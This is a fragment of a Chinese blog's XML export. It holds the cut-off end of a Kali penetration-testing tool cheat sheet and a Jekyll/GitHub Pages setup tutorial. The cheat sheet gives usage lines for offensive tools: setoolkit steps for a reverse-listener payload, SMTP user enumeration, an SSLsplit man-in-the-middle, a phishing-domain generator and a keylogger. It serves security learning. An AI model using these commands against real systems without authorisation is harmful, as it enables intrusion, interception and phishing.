[recon-ng][default][csv]&gt; run searchsploit描述: 从Exploit Database搜索exp用法：12$ searchsploit oracle windows remote$ searchsploit linux kernel 2.6 setoolkit描述: 社会工程师工具包用法：123456789$ setoolkit # 根据自己的需要，选择相应的编号进行操作: set&gt; 1 set&gt; 4 # 根据自己的目标系统选择相应的攻击载荷: set:payloads&gt; 2 # 输入攻击者的ip、端口： set:payloads&gt; IP address for the payload listener (LHOST):192.168.0.212 set:payloads&gt; Enter the PORT for the reverse listener:1234 smtp-user-enum描述: SMTP用户枚举是一个工具，用于枚举操作系统级别的用户帐户在Solaris通过SMTP服务（邮件）。用法：1$ smtp-user-enum -M VRFY -u root -t 192.168.1.25 snmpcheck描述: SNMP枚举工具。用法：1$ snmpcheck -t 192.168.1.2 -c public sslcaudit描述: 实用的自动化测试的SSL / TLS的客户端来抵抗中间人攻击。用法：1$ caudit -l 0.0.0.0:443 -v 1 SSLsplit描述: 中间人攻击，将https协议强制替换为http。。用法：1$ sslsplit -D -l connections.log -j /tmp/sslsplit/ -S /tmp/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 SSLyze描述: 是一款使用Python实现的SSL扫描工具，它可以扫描出SSL中一些经典的配置错误。用法：1$ sslyze --regular www.example.com theharvester描述: 邮箱挖掘器。用法：1$ theharvester -d kali.org -l 500 -b google tlssled描述: TLSSLed是一个Linux bash脚本,它的功能是测试目标SSL/TLS(HTTPS)WEB 服务器的安全性。TLSSLed基于sslscan，功能包括：测试目标是否支持SSLv2协议、NULL cipher等等。用法：1$ tlssled 192.168.1.1 443 tshark描述: 可以直接过滤数据包导出用法：1$ tshark -f "tcp port 80" -i eth0 urlcrazy描述: 钓鱼域名。用法：1$ urlcrazy -k dvorak -r example.com whatweb描述: WhatWeb是一款网站指纹识别工具，主要针对的问题是：“这个网站使用的什么技术？”WhatWeb可以告诉你网站搭建使用的程序，包括何种CMS系统、什么博客系统、Javascript库、web服务器、内嵌设备等。WhatWeb有超过900个插件，并且可以识别版本号、email地址、账号、web框架、SQL错误等等。用法：1$ whatweb www.example.com Wireshark描述: 流量分析。用法：1$ wireshark xspy描述: 键盘记录器用法：1$ xspy yersinia描述: 是国外的一款专门针对交换机执行第二层攻击的一个攻击工具。用法：1$ yersinia -G zaproxy描述: 一个易于使用交互式的用于web应用程序漏洞挖掘的渗透测试工具。用法：1$ zaproxy]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>tool</tag>
        <tag>kali</tag>
        <tag>information gathering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github + Markdown + Jekyll 搭建博客]]></title>
    <url>%2F2016%2F07%2F04%2Fgithub-markdown-jekyll%2F</url>
    <content type="text"><![CDATA[概述Github + Markdown + Jekyll 搭建博客的步骤如下，不过首先得注册Github账号，以及创建一个Repository,命名格式为：username.github.io（username 必须和账号一致。）这样就生成了属于你的Github下的网页,其中过程可以参照GitHub Pages。 安装安装Kekyll需要以下环境： Ruby2.0以上 RubyGems Linux,Unix,Mac OS 安装Ruby2.012$ sudo apt-get install ruby2.0 $ sudo apt-get install ruby2.0-dev 由于我的Ubuntu 14.04默认的Ruby是1.9.3，而Ruby 2.0则需要用命令ruby2.0运行，程序前必须设定好运行版本，不然会运行错误。于是我强制替换了/usr/bin目录下与Ruby相关的符号链接到Ruby 2.0对应的版本，进行了如下步骤： 12345678$ cd /usr/bin/ $ ln -sf ruby2.0 ruby $ ln -sf gem2.0 gem $ ln -sf erb2.0 erb $ ln -sf irb2.0 irb $ ln -sf rake2.0 rake $ ln -sf rdoc2.0 rdoc $ ln -sf testrb2.0 testrb 替换完后还要更新下gem： 12$ gem update \-\-system $ gem pristine \-\-all 这时Ruby的默认版本就已经切换到Ruby 2.0了。当然虽然这样做比较暴力，但也是可以还原的，如果想切换会Ruby 1.9.3，只需要运行（请注意在Ubuntu 14.04中，Ruby 1.9.3的名称为ruby1.9.1）,这里另外附上还原Ruby 1.9.3的方法： 12345678910$ cd /usr/bin/ $ ln -sf ruby1.9.1 ruby $ ln -sf gem1.9.1 gem $ ln -sf erb1.9.1 erb $ ln -sf irb1.9.1 irb $ ln -sf rake1.9.1 rake $ ln -sf rdoc1.9.1 rdoc $ ln -sf testrb1.9.1 testrb $ gem update \-\-system $ gem pristine \-\-all 安装Jekyll12$ gem install jekyll $ gem install bundler 安装模板解释器RDiscount默认模板是Maruku，这里替换为RDiscount。Maruku是纯ruby写的Markdown模板解释器。RDiscount是C写的模板解释器，重点是它的效率比Maruku快很多。 1$ gem install rdiscount 新建一个Jekyll目录1$ jekyll new blogname 然后bundle12$ bundle update $ bundle install 启动server因为Jekyll自带一个服务器，所以可以直接运行服务。只不过它默认是只能本机访问4000端口（使用--host 服务器IP参数，可允许外部IP访问），而且并不是后台运行（可用--detach后台运行）。 1$ jekyll serve \-\-host 自己外网IP \-\-detach OK！ 可以用浏览器访问这个服务器http://IP:4000。关闭后台程序： 1$ kill -9 pid 修改配置1$ vim _config.yml 修改里面的url为username.github.io（username是你的github账户名） 上传github1234$ git init $ git add \-\-all $ git commit -m "博客" $ git push origin maste 过一会就可已访问username.github.io（username是你的github账户名）了 Jekyll主题接下来再说说jeykll的目录结构。Jekyll的核心其实是一个文本转换引擎。它的概念其实就是：你用你最喜欢的标记语言来写文章，可以是Markdown,也可以是 Textile, 或者就是简单的 HTML, 然后 Jekyll 就会帮你套入一个或一系列的布局中。在整个过程中你可以设置 URL 路径，你的文本在布局中的显示样式等等。这些都可以通过纯文本编辑来实现，最终生成的静态页面就是你的成果。 至于Jekyll的主题，你可以参照jekyllthemes。找到合适的主题之后，只要修改_config.yml即可，然后就是再_posts里写文章了，文章的命名格式为YYYY-MM-DD-name-of-post.md。而Markdown的语法可以参照Markdown语法,至于Markdown的编辑器，最好不要用vim，去下个专门的编辑器。]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>jekyll</tag>
        <tag>github</tag>
        <tag>blog</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
</search>
